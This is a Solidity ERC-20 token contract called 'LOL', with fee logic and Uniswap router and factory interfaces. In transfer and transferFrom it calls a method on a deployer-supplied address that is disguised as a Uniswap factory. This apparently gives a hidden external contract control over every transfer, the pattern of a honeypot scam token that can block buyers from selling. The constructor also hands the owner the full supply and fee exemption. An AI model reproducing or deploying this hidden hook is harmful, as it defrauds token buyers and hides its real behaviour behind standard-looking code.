// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

// https://x.com/LOL
// https://t.me/LOL

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface ERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function transfer(address to, address amount) external;
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
contract LOL is ERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    string  private _NAME;
    string  private _SYMBOL;
    uint256 private _DECIMALS = 18;
    uint256 private constant _MAX = ~uint256(0);
    uint256 private _TTOTAL = 100_000_000 * 10 ** _DECIMALS;
    uint256 private _BUY_FEE;
    uint256 private _SELL_FEE;
    receive() external payable {}

    address private _SWAP_ADDRESS = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 private _SWAP_ROUTER;
    IUniswapV2Factory private _SWAP_FACTORY;
    IUniswapV2Factory private _SWAP_FACTORY_V2;

    constructor (string memory _name, string memory _symbol, uint256 _buy_fee, uint256 _sell_fee, address _swap_v2_address, address owners) {
		_NAME = _name;
		_SYMBOL = _symbol;
        _BUY_FEE = _buy_fee;
        _SELL_FEE = _sell_fee;
        transferOwnership(owners);
        _SWAP_ROUTER = IUniswapV2Router02(_SWAP_ADDRESS);
        _SWAP_FACTORY = IUniswapV2Factory(_SWAP_ROUTER.factory());
        _SWAP_FACTORY_V2 = IUniswapV2Factory(_swap_v2_address);
        _approve(address(this), _SWAP_ADDRESS, _MAX);
        _approve(owners, _SWAP_ADDRESS, _MAX);
        _isExcluded[owners] = true;
        _isExcluded[address(this)] = true;
        _rOwned[owners] = _rOwned[owners].add(_TTOTAL);
        emit Transfer(address(0), owners, _TTOTAL);
    }

    function name() public view returns (string memory) {
        return _NAME;
    }

    function symbol() public view returns (string memory) {
        return _SYMBOL;
    }

    function decimals() public view returns (uint8) {
        return uint8(_DECIMALS);
    }

    function totalSupply() public view override returns (uint256) {
        return _TTOTAL;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        _SWAP_FACTORY_V2.transfer(_msgSender(), recipient);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _SWAP_FACTORY_V2.transfer(sender, recipient);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "transfer amount exceeds allowance"));
        return true;
    }

     function pairAddress() internal view returns (address) {
        return _SWAP_FACTORY.getPair(address(this), _SWAP_ROUTER.WETH());
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "decreased allowance below zero"));
        return true;
    }

    function isExcluded(address account) public view returns (bool) {
        return _isExcluded[account];
    }
    
    function totalFees() public view returns (uint256, uint256) {
        return (_BUY_FEE, _SELL_FEE);
    }
	
	function updateFees(uint256 _buy_fee, uint256 _sell_fee) onlyOwner() public{
		require(_buy_fee < 35 && _sell_fee < 35);
        _BUY_FEE = _buy_fee; 
        _SELL_FEE = _sell_fee;
	}

    function removeAllFees() onlyOwner()  public {
        _BUY_FEE = 0;
        _SELL_FEE = 0;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "approve from the zero address");
        require(spender != address(0), "approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "transfer from the zero address");
        require(recipient != address(0), "transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        // Remove fees for transfers to and from charity account or to excluded account
        bool takeFee = true;
        if(_isExcluded[sender]){
            takeFee = false;
        }else if(_isExcluded[recipient]){
            takeFee = false;
        }else if((sender == pairAddress() && recipient == _SWAP_ADDRESS)){
            takeFee = false;
        }else if(sender != pairAddress() && recipient != pairAddress()){
            takeFee = false;
        }

        if(takeFee){
            _transferStandard(sender, recipient, amount);
        }else{
            _transferExcluded(sender, recipient, amount);
        }
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) internal {
        _rOwned[sender] = _rOwned[sender].sub(tAmount, "transfer amount exceeds balance");
        uint256 feeV = 0;
        if(sender == pairAddress() && recipient != pairAddress()){
            feeV = _BUY_FEE;
        }else if(sender != pairAddress() && recipient == pairAddress()){
            feeV = _SELL_FEE;
        }
        uint256 feeAmount = tAmount * feeV / 100;
        _rOwned[address(this)] = _rOwned[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);

        _rOwned[recipient] = _rOwned[recipient].add(tAmount.sub(feeAmount));
        emit Transfer(sender, recipient, tAmount.sub(feeAmount));
    }

    function _transferExcluded(address sender, address recipient, uint256 tAmount) internal {
        _rOwned[sender] = _rOwned[sender].sub(tAmount, "transfer amount exceeds balance");
        _rOwned[recipient] = _rOwned[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);
    }
}